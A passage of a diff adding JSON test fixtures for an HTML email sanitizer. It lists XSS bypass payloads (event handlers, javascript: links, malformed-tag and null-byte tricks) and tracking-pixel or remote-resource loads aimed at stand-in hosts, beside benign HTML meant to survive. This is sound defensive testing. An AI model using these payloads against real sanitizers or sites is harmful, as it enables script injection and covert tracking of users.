+  },
+  {
+   "id": "attribute-10",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div is=\"x-evil\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-11",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<a href=\"https://example.org\" ping=\"https://evil.example/track\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-12",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<a href=\"https://example.org\" download=\"x.exe\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-13",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<a href=\"https://example.org\" referrerpolicy=\"unsafe-url\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-14",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<a href=\"https://example.org\" target=\"_top\" rel=\"opener\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-15",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<a href=\"https://example.org\" target=\"evil\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-16",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<a href=\"https://example.org\" rel=\"\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-17",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<img src=\"cid:x\" srcset=\"http://evil.example/x 1x\" sizes=\"100vw\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-18",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<img src=\"cid:x\" loading=\"lazy\" decoding=\"async\" fetchpriority=\"high\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-19",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<img src=\"cid:x\" usemap=\"#m\"><map name=\"m\"><area href=\"javascript:alert(1)\" shape=default></map>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-20",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div\u000bonclick=alert(1)>ok</div>"
+  },
+  {
+   "id": "attribute-21",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div\fonclick=alert(1)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-22",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div/onclick=alert(1)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-23",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div onclick=alert(1)/>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-24",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div \"onclick\"=alert(1)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-25",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div 'onclick'=alert(1)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-26",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div onclick=\"alert(1)\"onmouseover=\"alert(2)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-27",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div onclick=alert(1)onmouseover=alert(2)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-28",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div =onclick=alert(1)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-29",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div onclick\u0000=alert(1)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-30",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "</ script><script>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-31",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "</div onclick=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-32",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div></div\n onclick=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-33",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<<img src=x onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-34",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<img src=x onerror=alert(1)//>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-35",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<img src=x onerror=alert(1) <b>ok</b>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-36",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<img src=\"x\" alt=\"\" onerror=alert(1)/>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "external-01",
+   "category": "external",
+   "kind": "attack",
+   "html": "<img src=\"http://tracker.example/p.gif\" width=1 height=1>ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-02",
+   "category": "external",
+   "kind": "attack",
+   "html": "<img src=\"https://tracker.example/p.gif?u=alice\">ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-03",
+   "category": "external",
+   "kind": "attack",
+   "html": "<img src=\"//tracker.example/p.gif\">ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-04",
+   "category": "external",
+   "kind": "attack",
+   "html": "<img src=\"HTTP://TRACKER.EXAMPLE/P.GIF\">ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-05",
+   "category": "external",
+   "kind": "attack",
+   "html": "<img src=\" http://tracker.example/p.gif\">ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-06",
+   "category": "external",
+   "kind": "attack",
+   "html": "<img src=\"http://tracker.example/p.gif\" srcset=\"http://tracker.example/2x.gif 2x\">ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-07",
+   "category": "external",
+   "kind": "attack",
+   "html": "<img srcset=\"http://tracker.example/1.gif 1x, http://tracker.example/2.gif 2x\">ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-08",
+   "category": "external",
+   "kind": "attack",
+   "html": "<picture><source srcset=\"http://tracker.example/x.webp\"><img src=\"http://tracker.example/x.png\"></picture>ok",
+   "keeps": [
+    "ok"
+   ],
+   "note": "<picture> is dropped whole: nothing to show"
+  },
+  {
+   "id": "external-09",
+   "category": "external",
+   "kind": "attack",
+   "html": "<table background=\"http://tracker.example/bg.gif\"><tr><td>ok</td></tr></table>",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-10",
+   "category": "external",
+   "kind": "attack",
+   "html": "<table><tr><td background=\"https://tracker.example/bg.gif\">ok</td></tr></table>",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-11",
+   "category": "external",
+   "kind": "attack",
+   "html": "<table><tr><td style=\"background:url(http://tracker.example/bg.gif)\">ok</td></tr></table>",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-12",
+   "category": "external",
+   "kind": "attack",
+   "html": "<div style=\"background-image:url('https://tracker.example/bg.png')\">ok</div>",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-13",
+   "category": "external",
+   "kind": "attack",
+   "html": "<div style=\"background:url(&quot;https://tracker.example/bg.png&quot;) no-repeat\">ok</div>",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-14",
+   "category": "external",
+   "kind": "attack",
+   "html": "<style>@import url(http://tracker.example/x.css);</style>ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-15",
+   "category": "external",
+   "kind": "attack",
+   "html": "<style>p{background:url(http://tracker.example/x.png)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "external-16",
+   "category": "external",
+   "kind": "attack",
+   "html": "<style>@font-face{font-family:x;src:url(https://tracker.example/f.woff2)}</style>ok",
+   "keeps": [
+    "ok"
+   ],
+   "minBlocked": 1
+  },
+  {
+   "id": "benign-01",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<table width=\"600\" cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"#ffffff\"><tr><td align=\"center\" style=\"font-family:Arial,sans-serif;font-size:16px;color:#333333\"><h1>Hello</h1><p>Visible <b>bold</b> and <i>italic</i> text.</p></td></tr></table>",
+   "keeps": [
+    "<table",
+    "bgcolor=\"#ffffff\"",
+    "Hello",
+    "<b>bold</b>",
+    "<i>italic</i>"
+   ]
+  },
+  {
+   "id": "benign-02",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<p>Read <a href=\"https://example.org/page?a=1&amp;b=2\">the page</a> or mail <a href=\"mailto:anna@example.org\">Anna</a> or call <a href=\"tel:+4930123456\">us</a>.</p>",
+   "keeps": [
+    "href=\"https://example.org/page?a=1&amp;b=2\"",
+    "href=\"mailto:anna@example.org\"",
+    "href=\"tel:+4930123456\"",
+    "target=\"_blank\"",
+    "rel=\"noopener noreferrer\""
+   ]
+  },
+  {
+   "id": "benign-03",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<p><img src=\"cid:logo@example.org\" alt=\"Logo\" width=\"100\" height=\"40\"></p>",
+   "keeps": [
+    "src=\"cid:logo@example.org\"",
+    "alt=\"Logo\"",
+    "width=\"100\""
+   ]
+  },
+  {
+   "id": "benign-04",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<p><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg==\" alt=\"dot\"></p>",
+   "keeps": [
+    "data:image/png;base64,iVBORw0KGgo",
+    "alt=\"dot\""
+   ]
+  },
+  {
+   "id": "benign-05",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<style>.title{font-size:20px;font-weight:bold;color:#444}@media (max-width:600px){.title{font-size:16px}}</style><p class=\"title\">Styled</p>",
+   "keeps": [
+    "font-size: 20px",
+    "font-weight: bold",
+    "@media",
+    "class=\"title\"",
+    "Styled"
+   ]
+  },
+  {
+   "id": "benign-06",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<blockquote style=\"border-left:3px solid #ccc;margin:0 0 0 8px;padding-left:12px\">On Friday Anna wrote:<br>Hello!</blockquote>",
+   "keeps": [
+    "<blockquote",
+    "border-left",
+    "On Friday Anna wrote:",
+    "<br>"
+   ]
+  },
+  {
+   "id": "benign-07",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<ul><li>one</li><li>two</li></ul><ol start=\"3\"><li>three</li></ol><pre>code  block\n  indented</pre><hr>",
+   "keeps": [
+    "<ul>",
+    "<li>one</li>",
+    "start=\"3\"",
+    "<pre>",
+    "<hr>"
+   ]
+  },
+  {
+   "id": "benign-08",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<div dir=\"rtl\" lang=\"ar\">\u0645\u0631\u062d\u0628\u0627</div><p>\u041f\u0440\u0438\u0432\u0435\u0442, \u043c\u0438\u0440! \u65e5\u672c\u8a9e</p>",
+   "keeps": [
+    "dir=\"rtl\"",
+    "\u0645\u0631\u062d\u0628\u0627",
+    "\u041f\u0440\u0438\u0432\u0435\u0442, \u043c\u0438\u0440!",
+    "\u65e5\u672c\u8a9e"
+   ]
+  },
+  {
+   "id": "benign-09",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<p>1 &lt; 2 &amp;&amp; 3 &gt; 2, \"quotes\" &amp; <code>&lt;script&gt;</code> shown as text.</p>",
+   "keeps": [
+    "1 &lt; 2 &amp;&amp; 3 &gt; 2",
+    "&lt;script&gt;"
+   ]
+  },
+  {
+   "id": "benign-10",
+   "category": "benign",
+   "kind": "benign",
+   "html": "<font face=\"Verdana\" size=\"2\" color=\"#336699\">Old style</font><center>centered</center><strike>old</strike>",
+   "keeps": [
+    "<font",
+    "face=\"Verdana\"",
+    "<center>",
+    "<strike>"
+   ]
+  }
+ ]
+}
